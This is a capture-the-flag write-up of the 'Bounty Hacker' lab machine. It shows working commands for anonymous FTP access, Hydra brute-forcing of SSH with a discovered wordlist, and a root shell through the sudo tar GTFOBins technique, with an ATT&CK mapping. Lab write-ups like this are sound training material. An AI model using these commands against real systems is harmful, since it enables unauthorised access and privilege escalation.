Written By Aryan Giri

# Bounty Hacker

> You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Target

Target IP:

```text
10.48.151.229
```

As usual, we start with enumeration. Because apparently machines still leave their doors open and expect nobody to knock.

## Enumeration

I started with an Nmap version and default-script scan:

```bash
nmap -sV -sC 10.48.151.229
```

<img width="1024" height="813" alt="Screenshot 2026-09-29 193226" src="https://github.com/user-attachments/assets/3981bd3c-354b-4920-b0ca-97ed144ad7ce" />

The scan shows three interesting services:

* FTP on port 21
* SSH on port 22
* HTTP on port 80

The Nmap scripts also reveal that anonymous FTP login is allowed. That makes FTP the first service worth investigating.

## FTP Enumeration

Connect to the FTP service:

```bash
ftp 10.48.151.229
```

When prompted for the username, use:

```text
anonymous
```

After logging in, list the available files:

```text
ls
```

<img width="692" height="412" alt="Screenshot 2026-09-29 193334" src="https://github.com/user-attachments/assets/a64b9555-6ebc-41a5-aaa9-d079edd46e37" />


We find two files:

```text
locks.txt
task.txt
```

Both files look interesting, so download them:

```text
get locks.txt
```

```text
get task.txt
```

<img width="808" height="322" alt="Screenshot 2026-09-29 193414" src="https://github.com/user-attachments/assets/8383db03-b987-41f8-91d7-cfb518617f41" />


Exit FTP and inspect the downloaded files locally.

```bash
cat locks.txt
```

<img width="538" height="313" alt="Screenshot 2026-09-29 193622" src="https://github.com/user-attachments/assets/cfaca64d-dbb6-43de-a8ce-42a8330c4ed4" />


The `locks.txt` file contains what appears to be a list of possible passwords.

Now check `task.txt`:

```bash
cat task.txt
```

<img width="527" height="144" alt="Screenshot 2026-09-29 193637" src="https://github.com/user-attachments/assets/4cfca034-3115-4c09-8eb1-edbfc76b3613" />


The file contains a short task list signed by:

```text
-lin
```

Therefore, the username we have discovered is:

```text
lin
```

This also answers the room question:

**Who wrote the task list?**

```text
lin
```

## Brute-Forcing SSH

At this point we know:

* Username: `lin`
* Password candidates: `locks.txt`
* SSH is running on port 22

The room asks:

**What service can you bruteforce with the text file found?**

SSH fits because it is an authentication service exposed on the target.

I used Hydra with the discovered username and password list:

```bash
hydra -l lin -P locks.txt ssh://10.48.151.229
```

<img width="836" height="458" alt="Screenshot 2026-09-29 194256" src="https://github.com/user-attachments/assets/8a87a79b-33d7-401b-8908-6ef5ff8879f7" />


Hydra successfully finds the SSH password.

This is a straightforward password-guessing attack using a discovered wordlist. MITRE ATT&CK classifies systematic password guessing as **T1110.001 - Password Guessing**.

## SSH Access

Now that we have valid credentials, connect to the machine:

```bash
ssh lin@10.48.151.229
```

Enter the password discovered by Hydra.

Once logged in, check the current directory:

```bash
ls
```

The `user.txt` flag is present.

Read it with:

```bash
cat user.txt
```

<img width="574" height="139" alt="Screenshot 2026-09-29 194437" src="https://github.com/user-attachments/assets/04a7ab09-8149-4310-a175-18b553d27702" />


The user flag is now captured.

## Privilege Escalation

With user access obtained, the next step is to check what commands the `lin` account can execute with elevated privileges.

Run:

```bash
sudo -l
```

Enter the SSH password when prompted.

<img width="814" height="233" alt="Screenshot 2026-09-29 194531" src="https://github.com/user-attachments/assets/2fe75731-7e68-4d17-944f-83e099405c7c" />


The output shows that `lin` can execute `tar` as root.

This is the important privilege-escalation finding:

```text
(root) /bin/tar
```

Whenever a user can execute a powerful binary as root, it is worth checking whether that binary has a known privilege-escalation technique.

For this box, `tar` has a known GTFOBins technique that can be used to spawn a shell with the privileges of the executing user.

I prefer Bash, so I used:

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

The command gives us a root shell.

Verify the current user:

```bash
whoami
```

Expected output:

```text
root
```

Now we can read the root flag:

```bash
cd /root
cat root.txt
```

or 
```
cat /root/root.txt
```

<img width="791" height="253" alt="Screenshot 2026-09-29 203532" src="https://github.com/user-attachments/assets/fc79b754-24ab-453a-97f2-b7cc885b9f86" />


And that completes the machine.

## MITRE ATT&CK Mapping

The attack chain in this room can be mapped to several MITRE ATT&CK techniques. Not every CTF step has a perfect one-to-one ATT&CK mapping, so these are the closest applicable techniques.

| Stage                | Technique                                           | ID        | How it applies                                                            |
| -------------------- | --------------------------------------------------- | --------- | ------------------------------------------------------------------------- |
| FTP file retrieval   | Application Layer Protocol: File Transfer Protocols | T1071.002 | FTP is used to transfer `locks.txt` and `task.txt`.                       |
| Password brute force | Password Guessing                                   | T1110.001 | Hydra systematically tests passwords from `locks.txt` against SSH.        |
| SSH login            | Remote Services: SSH                                | T1021.004 | The discovered credentials are used to access the Linux host through SSH. |
| Credential use       | Valid Accounts: Local Accounts                      | T1078.003 | The recovered credentials provide access to the local `lin` account.      |
| Privilege escalation | Sudo and Sudo Caching                               | T1548.003 | The `sudoers` configuration allows `lin` to execute `tar` as root.        |
| Shell execution      | Unix Shell                                          | T1059.004 | The `tar` technique spawns a Bash shell running with elevated privileges. |

The main attack chain is therefore:

```text
Anonymous FTP
      |
      v
Discover locks.txt + task.txt
      |
      v
Identify username: lin
      |
      v
Password guessing against SSH
      |
      v
Valid SSH credentials
      |
      v
SSH access as lin
      |
      v
sudo -l
      |
      v
tar allowed as root
      |
      v
tar -> Bash
      |
      v
Root shell
      |
      v
root.txt
```

## HTTP Service

Port 80 was also open during enumeration.

The webpage contains a message and an image related to the room's scenario. I checked it, but it did not provide anything necessary for the path used in this writeup.

<img width="1490" height="812" alt="Screenshot 2026-09-29 194053" src="https://github.com/user-attachments/assets/dd7bdc7a-9f63-46df-86f5-dde1a9185098" />


So for this particular route, the useful attack surface was:

```text
FTP -> credentials -> SSH -> sudo tar -> root
```

## Conclusion

Bounty Hacker is a short room built around a clean enumeration-to-privilege-escalation chain:

1. Enumerate the target with Nmap.
2. Discover anonymous FTP access.
3. Download `locks.txt` and `task.txt`.
4. Identify `lin` as the username.
5. Use `locks.txt` to brute-force SSH.
6. Log in through SSH.
7. Retrieve `user.txt`.
8. Run `sudo -l`.
9. Discover that `tar` can be executed as root.
10. Abuse `tar` to spawn a root Bash shell.
11. Retrieve `root.txt`.

The interesting part is not any single command. It is the chain: one exposed service provides information that enables access to another service, and the resulting account has a dangerous sudo permission that leads to full root access.
